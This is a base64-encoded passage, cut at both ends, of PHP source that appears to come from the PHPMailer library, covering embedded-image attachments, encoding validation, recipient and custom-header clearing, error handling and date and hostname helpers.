gaW1nYCB0YWdzLCBmb3IgZXhhbXBsZSBgPGltZyBzcmM9ImNpZDpteWxvZ28iPmAuCiAgICAgKiBOZXZlciB1c2UgYSB1c2VyLXN1cHBsaWVkIHBhdGggdG8gYSBmaWxlIQogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHBhdGggICAgICAgIFBhdGggdG8gdGhlIGF0dGFjaG1lbnQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGNpZCAgICAgICAgIENvbnRlbnQgSUQgb2YgdGhlIGF0dGFjaG1lbnQ7IFVzZSB0aGlzIHRvIHJlZmVyZW5jZQogICAgICogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhlIGNvbnRlbnQgd2hlbiB1c2luZyBhbiBlbWJlZGRlZCBpbWFnZSBpbiBIVE1MCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lICAgICAgICBPdmVycmlkZXMgdGhlIGF0dGFjaG1lbnQgZmlsZW5hbWUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nICAgIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpIGRlZmF1bHRzIHRvIGBiYXNlNjRgCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlICAgICAgICBGaWxlIE1JTUUgdHlwZSAoYnkgZGVmYXVsdCBtYXBwZWQgZnJvbSB0aGUgYCRwYXRoYCBmaWxlbmFtZSdzIGV4dGVuc2lvbikKICAgICAqIEBwYXJhbSBzdHJpbmcgJGRpc3Bvc2l0aW9uIERpc3Bvc2l0aW9uIHRvIHVzZTogYGlubGluZWAgKGRlZmF1bHQpIG9yIGBhdHRhY2htZW50YAogICAgICogICAgICAgICAgICAgICAgICAgICAgICAgICAgKHVubGlrZWx5IHlvdSB3YW50IHRoaXMg4oCTIHtAc2VlIGBhZGRBdHRhY2htZW50KClgfSBpbnN0ZWFkKQogICAgICoKICAgICAqIEByZXR1cm4gYm9vbCBUcnVlIG9uIHN1Y2Nlc3NmdWxseSBhZGRpbmcgYW4gYXR0YWNobWVudAogICAgICogQHRocm93cyBFeGNlcHRpb24KICAgICAqCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRFbWJlZGRlZEltYWdlKAogICAgICAgICRwYXRoLAogICAgICAgICRjaWQsCiAgICAgICAgJG5hbWUgPSAnJywKICAgICAgICAkZW5jb2RpbmcgPSBzZWxmOjpFTkNPRElOR19CQVNFNjQsCiAgICAgICAgJHR5cGUgPSAnJywKICAgICAgICAkZGlzcG9zaXRpb24gPSAnaW5saW5lJwogICAgKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKCFzdGF0aWM6OmZpbGVJc0FjY2Vzc2libGUoJHBhdGgpKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdmaWxlX2FjY2VzcycpIC4gJHBhdGgsIHNlbGY6OlNUT1BfQ09OVElOVUUpOwogICAgICAgICAgICB9CgogICAgICAgICAgICAvL0lmIGEgTUlNRSB0eXBlIGlzIG5vdCBzcGVjaWZpZWQsIHRyeSB0byB3b3JrIGl0IG91dCBmcm9tIHRoZSBmaWxlIG5hbWUKICAgICAgICAgICAgaWYgKCcnID09PSAkdHlwZSkgewogICAgICAgICAgICAgICAgJHR5cGUgPSBzdGF0aWM6OmZpbGVuYW1lVG9UeXBlKCRwYXRoKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCEkdGhpcy0+dmFsaWRhdGVFbmNvZGluZygkZW5jb2RpbmcpKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdlbmNvZGluZycpIC4gJGVuY29kaW5nKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJGZpbGVuYW1lID0gKHN0cmluZykgc3RhdGljOjptYl9wYXRoaW5mbygkcGF0aCwgUEFUSElORk9fQkFTRU5BTUUpOwogICAgICAgICAgICBpZiAoJycgPT09ICRuYW1lKSB7CiAgICAgICAgICAgICAgICAkbmFtZSA9ICRmaWxlbmFtZTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy9BcHBlbmQgdG8gJGF0dGFjaG1lbnQgYXJyYXkKICAgICAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnRbXSA9IFsKICAgICAgICAgICAgICAgIDAgPT4gJHBhdGgsCiAgICAgICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwKICAgICAgICAgICAgICAgIDIgPT4gJG5hbWUsCiAgICAgICAgICAgICAgICAzID0+ICRlbmNvZGluZywKICAgICAgICAgICAgICAgIDQgPT4gJHR5cGUsCiAgICAgICAgICAgICAgICA1ID0+IGZhbHNlLCAvL2lzU3RyaW5nQXR0YWNobWVudAogICAgICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgICAgICA3ID0+ICRjaWQsCiAgICAgICAgICAgIF07CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOwogICAgICAgICAgICB9CgogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhbiBlbWJlZGRlZCBzdHJpbmdpZmllZCBhdHRhY2htZW50LgogICAgICogVGhpcyBjYW4gaW5jbHVkZSBpbWFnZXMsIHNvdW5kcywgYW5kIGp1c3QgYWJvdXQgYW55IG90aGVyIGRvY3VtZW50IHR5cGUuCiAgICAgKiBJZiB5b3VyIGZpbGVuYW1lIGRvZXNuJ3QgY29udGFpbiBhbiBleHRlbnNpb24sIGJlIHN1cmUgdG8gc2V0IHRoZSAkdHlwZSB0byBhbiBhcHByb3ByaWF0ZSBNSU1FIHR5cGUuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyaW5nICAgICAgVGhlIGF0dGFjaG1lbnQgYmluYXJ5IGRhdGEKICAgICAqIEBwYXJhbSBzdHJpbmcgJGNpZCAgICAgICAgIENvbnRlbnQgSUQgb2YgdGhlIGF0dGFjaG1lbnQ7IFVzZSB0aGlzIHRvIHJlZmVyZW5jZQogICAgICogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhlIGNvbnRlbnQgd2hlbiB1c2luZyBhbiBlbWJlZGRlZCBpbWFnZSBpbiBIVE1MCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lICAgICAgICBBIGZpbGVuYW1lIGZvciB0aGUgYXR0YWNobWVudC4gSWYgdGhpcyBjb250YWlucyBhbiBleHRlbnNpb24sCiAgICAgKiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQSFBNYWlsZXIgd2lsbCBhdHRlbXB0IHRvIHNldCBhIE1JTUUgdHlwZSBmb3IgdGhlIGF0dGFjaG1lbnQuCiAgICAgKiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGb3IgZXhhbXBsZSAnZmlsZS5qcGcnIHdvdWxkIGdldCBhbiAnaW1hZ2UvanBlZycgTUlNRSB0eXBlLgogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgICAgRmlsZSBlbmNvZGluZyAoc2VlICRFbmNvZGluZyksIGRlZmF1bHRzIHRvICdiYXNlNjQnCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlICAgICAgICBNSU1FIHR5cGUgLSB3aWxsIGJlIHVzZWQgaW4gcHJlZmVyZW5jZSB0byBhbnkgYXV0b21hdGljYWxseSBkZXJpdmVkIHR5cGUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGRpc3Bvc2l0aW9uIERpc3Bvc2l0aW9uIHRvIHVzZQogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBib29sIFRydWUgb24gc3VjY2Vzc2Z1bGx5IGFkZGluZyBhbiBhdHRhY2htZW50CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRTdHJpbmdFbWJlZGRlZEltYWdlKAogICAgICAgICRzdHJpbmcsCiAgICAgICAgJGNpZCwKICAgICAgICAkbmFtZSA9ICcnLAogICAgICAgICRlbmNvZGluZyA9IHNlbGY6OkVOQ09ESU5HX0JBU0U2NCwKICAgICAgICAkdHlwZSA9ICcnLAogICAgICAgICRkaXNwb3NpdGlvbiA9ICdpbmxpbmUnCiAgICApIHsKICAgICAgICB0cnkgewogICAgICAgICAgICAvL0lmIGEgTUlNRSB0eXBlIGlzIG5vdCBzcGVjaWZpZWQsIHRyeSB0byB3b3JrIGl0IG91dCBmcm9tIHRoZSBuYW1lCiAgICAgICAgICAgIGlmICgnJyA9PT0gJHR5cGUgJiYgIWVtcHR5KCRuYW1lKSkgewogICAgICAgICAgICAgICAgJHR5cGUgPSBzdGF0aWM6OmZpbGVuYW1lVG9UeXBlKCRuYW1lKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCEkdGhpcy0+dmFsaWRhdGVFbmNvZGluZygkZW5jb2RpbmcpKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdlbmNvZGluZycpIC4gJGVuY29kaW5nKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy9BcHBlbmQgdG8gJGF0dGFjaG1lbnQgYXJyYXkKICAgICAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnRbXSA9IFsKICAgICAgICAgICAgICAgIDAgPT4gJHN0cmluZywKICAgICAgICAgICAgICAgIDEgPT4gJG5hbWUsCiAgICAgICAgICAgICAgICAyID0+ICRuYW1lLAogICAgICAgICAgICAgICAgMyA9PiAkZW5jb2RpbmcsCiAgICAgICAgICAgICAgICA0ID0+ICR0eXBlLAogICAgICAgICAgICAgICAgNSA9PiB0cnVlLCAvL2lzU3RyaW5nQXR0YWNobWVudAogICAgICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgICAgICA3ID0+ICRjaWQsCiAgICAgICAgICAgIF07CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOwogICAgICAgICAgICB9CgogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAvKioKICAgICAqIFZhbGlkYXRlIGVuY29kaW5ncy4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZwogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gdmFsaWRhdGVFbmNvZGluZygkZW5jb2RpbmcpCiAgICB7CiAgICAgICAgcmV0dXJuIGluX2FycmF5KAogICAgICAgICAgICAkZW5jb2RpbmcsCiAgICAgICAgICAgIFsKICAgICAgICAgICAgICAgIHNlbGY6OkVOQ09ESU5HXzdCSVQsCiAgICAgICAgICAgICAgICBzZWxmOjpFTkNPRElOR19RVU9URURfUFJJTlRBQkxFLAogICAgICAgICAgICAgICAgc2VsZjo6RU5DT0RJTkdfQkFTRTY0LAogICAgICAgICAgICAgICAgc2VsZjo6RU5DT0RJTkdfOEJJVCwKICAgICAgICAgICAgICAgIHNlbGY6OkVOQ09ESU5HX0JJTkFSWSwKICAgICAgICAgICAgXSwKICAgICAgICAgICAgdHJ1ZQogICAgICAgICk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayBpZiBhbiBlbWJlZGRlZCBhdHRhY2htZW50IGlzIHByZXNlbnQgd2l0aCB0aGlzIGNpZC4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRjaWQKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGNpZEV4aXN0cygkY2lkKQogICAgewogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5hdHRhY2htZW50IGFzICRhdHRhY2htZW50KSB7CiAgICAgICAgICAgIGlmICgnaW5saW5lJyA9PT0gJGF0dGFjaG1lbnRbNl0gJiYgJGNpZCA9PT0gJGF0dGFjaG1lbnRbN10pIHsKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayBpZiBhbiBpbmxpbmUgYXR0YWNobWVudCBpcyBwcmVzZW50LgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaW5saW5lSW1hZ2VFeGlzdHMoKQogICAgewogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5hdHRhY2htZW50IGFzICRhdHRhY2htZW50KSB7CiAgICAgICAgICAgIGlmICgnaW5saW5lJyA9PT0gJGF0dGFjaG1lbnRbNl0pIHsKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayBpZiBhbiBhdHRhY2htZW50IChub24taW5saW5lKSBpcyBwcmVzZW50LgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYXR0YWNobWVudEV4aXN0cygpCiAgICB7CiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmF0dGFjaG1lbnQgYXMgJGF0dGFjaG1lbnQpIHsKICAgICAgICAgICAgaWYgKCdhdHRhY2htZW50JyA9PT0gJGF0dGFjaG1lbnRbNl0pIHsKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayBpZiB0aGlzIG1lc3NhZ2UgaGFzIGFuIGFsdGVybmF0aXZlIGJvZHkgc2V0LgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWx0ZXJuYXRpdmVFeGlzdHMoKQogICAgewogICAgICAgIHJldHVybiAhZW1wdHkoJHRoaXMtPkFsdEJvZHkpOwogICAgfQoKICAgIC8qKgogICAgICogQ2xlYXIgcXVldWVkIGFkZHJlc3NlcyBvZiBnaXZlbiBraW5kLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGtpbmQgJ3RvJywgJ2NjJywgb3IgJ2JjYycKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyUXVldWVkQWRkcmVzc2VzKCRraW5kKQogICAgewogICAgICAgICR0aGlzLT5SZWNpcGllbnRzUXVldWUgPSBhcnJheV9maWx0ZXIoCiAgICAgICAgICAgICR0aGlzLT5SZWNpcGllbnRzUXVldWUsCiAgICAgICAgICAgIHN0YXRpYyBmdW5jdGlvbiAoJHBhcmFtcykgdXNlICgka2luZCkgewogICAgICAgICAgICAgICAgcmV0dXJuICRwYXJhbXNbMF0gIT09ICRraW5kOwogICAgICAgICAgICB9CiAgICAgICAgKTsKICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIGFsbCBUbyByZWNpcGllbnRzLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJBZGRyZXNzZXMoKQogICAgewogICAgICAgIGZvcmVhY2ggKCR0aGlzLT50byBhcyAkdG8pIHsKICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJHRvWzBdKV0pOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+dG8gPSBbXTsKICAgICAgICAkdGhpcy0+Y2xlYXJRdWV1ZWRBZGRyZXNzZXMoJ3RvJyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgQ0MgcmVjaXBpZW50cy4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQ0NzKCkKICAgIHsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+Y2MgYXMgJGNjKSB7CiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5hbGxfcmVjaXBpZW50c1tzdHJ0b2xvd2VyKCRjY1swXSldKTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPmNjID0gW107CiAgICAgICAgJHRoaXMtPmNsZWFyUXVldWVkQWRkcmVzc2VzKCdjYycpOwogICAgfQoKICAgIC8qKgogICAgICogQ2xlYXIgYWxsIEJDQyByZWNpcGllbnRzLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJCQ0NzKCkKICAgIHsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+YmNjIGFzICRiY2MpIHsKICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJGJjY1swXSldKTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPmJjYyA9IFtdOwogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygnYmNjJyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgUmVwbHlUbyByZWNpcGllbnRzLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJSZXBseVRvcygpCiAgICB7CiAgICAgICAgJHRoaXMtPlJlcGx5VG8gPSBbXTsKICAgICAgICAkdGhpcy0+UmVwbHlUb1F1ZXVlID0gW107CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgcmVjaXBpZW50IHR5cGVzLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJBbGxSZWNpcGllbnRzKCkKICAgIHsKICAgICAgICAkdGhpcy0+dG8gPSBbXTsKICAgICAgICAkdGhpcy0+Y2MgPSBbXTsKICAgICAgICAkdGhpcy0+YmNjID0gW107CiAgICAgICAgJHRoaXMtPmFsbF9yZWNpcGllbnRzID0gW107CiAgICAgICAgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSA9IFtdOwogICAgfQoKICAgIC8qKgogICAgICogQ2xlYXIgYWxsIGZpbGVzeXN0ZW0sIHN0cmluZywgYW5kIGJpbmFyeSBhdHRhY2htZW50cy4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQXR0YWNobWVudHMoKQogICAgewogICAgICAgICR0aGlzLT5hdHRhY2htZW50ID0gW107CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgY3VzdG9tIGhlYWRlcnMuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckN1c3RvbUhlYWRlcnMoKQogICAgewogICAgICAgICR0aGlzLT5DdXN0b21IZWFkZXIgPSBbXTsKICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIGEgc3BlY2lmaWMgY3VzdG9tIGhlYWRlciBieSBuYW1lIG9yIG5hbWUgYW5kIHZhbHVlLgogICAgICogJG5hbWUgdmFsdWUgY2FuIGJlIG92ZXJsb2FkZWQgdG8gY29udGFpbgogICAgICogYm90aCBoZWFkZXIgbmFtZSBhbmQgdmFsdWUgKG5hbWU6dmFsdWUpLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgICAgICAkbmFtZSAgQ3VzdG9tIGhlYWRlciBuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nfG51bGwgJHZhbHVlIEhlYWRlciB2YWx1ZQogICAgICoKICAgICAqIEByZXR1cm4gYm9vbCBUcnVlIGlmIGEgaGVhZGVyIHdhcyByZXBsYWNlZCBzdWNjZXNzZnVsbHkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQ3VzdG9tSGVhZGVyKCRuYW1lLCAkdmFsdWUgPSBudWxsKQogICAgewogICAgICAgIGlmIChudWxsID09PSAkdmFsdWUgJiYgc3RycG9zKCRuYW1lLCAnOicpICE9PSBmYWxzZSkgewogICAgICAgICAgICAvL1ZhbHVlIHBhc3NlZCBpbiBhcyBuYW1lOnZhbHVlCiAgICAgICAgICAgIGxpc3QoJG5hbWUsICR2YWx1ZSkgPSBleHBsb2RlKCc6JywgJG5hbWUsIDIpOwogICAgICAgIH0KICAgICAgICAkbmFtZSA9IHRyaW0oJG5hbWUpOwogICAgICAgICR2YWx1ZSA9IChudWxsID09PSAkdmFsdWUpID8gbnVsbCA6IHRyaW0oJHZhbHVlKTsKCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPkN1c3RvbUhlYWRlciBhcyAkayA9PiAkcGFpcikgewogICAgICAgICAgICBpZiAoJHBhaXJbMF0gPT0gJG5hbWUpIHsKICAgICAgICAgICAgICAgIC8vIFdlIHJlbW92ZSB0aGUgaGVhZGVyIGlmIHRoZSB2YWx1ZSBpcyBub3QgcHJvdmlkZWQgb3IgaXQgbWF0Y2hlcy4KICAgICAgICAgICAgICAgIGlmIChudWxsID09PSAkdmFsdWUgfHwgICRwYWlyWzFdID09ICR2YWx1ZSkgewogICAgICAgICAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5DdXN0b21IZWFkZXJbJGtdKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXBsYWNlIGEgY3VzdG9tIGhlYWRlci4KICAgICAqICRuYW1lIHZhbHVlIGNhbiBiZSBvdmVybG9hZGVkIHRvIGNvbnRhaW4KICAgICAqIGJvdGggaGVhZGVyIG5hbWUgYW5kIHZhbHVlIChuYW1lOnZhbHVlKS4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICAgICAgJG5hbWUgIEN1c3RvbSBoZWFkZXIgbmFtZQogICAgICogQHBhcmFtIHN0cmluZ3xudWxsICR2YWx1ZSBIZWFkZXIgdmFsdWUKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wgVHJ1ZSBpZiBhIGhlYWRlciB3YXMgcmVwbGFjZWQgc3VjY2Vzc2Z1bGx5CiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcmVwbGFjZUN1c3RvbUhlYWRlcigkbmFtZSwgJHZhbHVlID0gbnVsbCkKICAgIHsKICAgICAgICBpZiAobnVsbCA9PT0gJHZhbHVlICYmIHN0cnBvcygkbmFtZSwgJzonKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgLy9WYWx1ZSBwYXNzZWQgaW4gYXMgbmFtZTp2YWx1ZQogICAgICAgICAgICBsaXN0KCRuYW1lLCAkdmFsdWUpID0gZXhwbG9kZSgnOicsICRuYW1lLCAyKTsKICAgICAgICB9CiAgICAgICAgJG5hbWUgPSB0cmltKCRuYW1lKTsKICAgICAgICAkdmFsdWUgPSAobnVsbCA9PT0gJHZhbHVlKSA/ICcnIDogdHJpbSgkdmFsdWUpOwoKICAgICAgICAkcmVwbGFjZWQgPSBmYWxzZTsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+Q3VzdG9tSGVhZGVyIGFzICRrID0+ICRwYWlyKSB7CiAgICAgICAgICAgIGlmICgkcGFpclswXSA9PSAkbmFtZSkgewogICAgICAgICAgICAgICAgaWYgKCRyZXBsYWNlZCkgewogICAgICAgICAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5DdXN0b21IZWFkZXJbJGtdKTsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChzdHJwYnJrKCRuYW1lIC4gJHZhbHVlLCAiXHJcbiIpICE9PSBmYWxzZSkgewogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdpbnZhbGlkX2hlYWRlcicpKTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT5DdXN0b21IZWFkZXJbJGtdID0gWyRuYW1lLCAkdmFsdWVdOwogICAgICAgICAgICAgICAgJHJlcGxhY2VkID0gdHJ1ZTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYW4gZXJyb3IgbWVzc2FnZSB0byB0aGUgZXJyb3IgY29udGFpbmVyLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJG1zZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0RXJyb3IoJG1zZykKICAgIHsKICAgICAgICArKyR0aGlzLT5lcnJvcl9jb3VudDsKICAgICAgICBpZiAoJ3NtdHAnID09PSAkdGhpcy0+TWFpbGVyICYmIG51bGwgIT09ICR0aGlzLT5zbXRwKSB7CiAgICAgICAgICAgICRsYXN0ZXJyb3IgPSAkdGhpcy0+c210cC0+Z2V0RXJyb3IoKTsKICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydlcnJvciddKSkgewogICAgICAgICAgICAgICAgJG1zZyAuPSAnICcgLiAkdGhpcy0+bGFuZygnc210cF9lcnJvcicpIC4gJGxhc3RlcnJvclsnZXJyb3InXTsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGxhc3RlcnJvclsnZGV0YWlsJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgJG1zZyAuPSAnICcgLiAkdGhpcy0+bGFuZygnc210cF9kZXRhaWwnKSAuICRsYXN0ZXJyb3JbJ2RldGFpbCddOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydzbXRwX2NvZGUnXSkpIHsKICAgICAgICAgICAgICAgICAgICAkbXNnIC49ICcgJyAuICR0aGlzLT5sYW5nKCdzbXRwX2NvZGUnKSAuICRsYXN0ZXJyb3JbJ3NtdHBfY29kZSddOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydzbXRwX2NvZGVfZXgnXSkpIHsKICAgICAgICAgICAgICAgICAgICAkbXNnIC49ICcgJyAuICR0aGlzLT5sYW5nKCdzbXRwX2NvZGVfZXgnKSAuICRsYXN0ZXJyb3JbJ3NtdHBfY29kZV9leCddOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICR0aGlzLT5FcnJvckluZm8gPSAkbXNnOwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJuIGFuIFJGQyA4MjIgZm9ybWF0dGVkIGRhdGUuCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiByZmNEYXRlKCkKICAgIHsKICAgICAgICAvL1NldCB0aGUgdGltZSB6b25lIHRvIHdoYXRldmVyIHRoZSBkZWZhdWx0IGlzIHRvIGF2b2lkIDUwMCBlcnJvcnMKICAgICAgICAvL1dpbGwgZGVmYXVsdCB0byBVVEMgaWYgaXQncyBub3Qgc2V0IHByb3Blcmx5IGluIHBocC5pbmkKICAgICAgICBkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KEBkYXRlX2RlZmF1bHRfdGltZXpvbmVfZ2V0KCkpOwoKICAgICAgICByZXR1cm4gZGF0ZSgnRCwgaiBNIFkgSDppOnMgTycpOwogICAgfQoKICAgIC8qKgogICAgICogR2V0IHRoZSBzZXJ2ZXIgaG9zdG5hbWUuCiAgICAgKiBSZXR1cm5zICdsb2NhbGhvc3QubG9jYWxkb21haW4nIGlmIHVua25vd24uCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNlcnZlckhvc3RuYW1lKCkKICAgIHsKICAgICAgICAkcmVzdWx0ID0gJyc7CiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+SG9zdG5hbWUpKSB7CiAgICAgICAgICAgICRyZXN1bHQgPSAkdGhpcy0+SG9zdG5hbWU7CiAgICAgICAgfSBlbHNlaWYgKGlzc2V0KCRfU0VSVkVSKSAmJiBhcnJheV9rZXlfZXhpc3RzKCdTRVJWRVJfTkFNRScsICRfU0VSVkVSKSkgewogICAgICAgICAgICAkcmVzdWx0ID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiAgICAgICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnZ2V0aG9zdG5hbWUnKSAmJiBnZXRob3N0bmF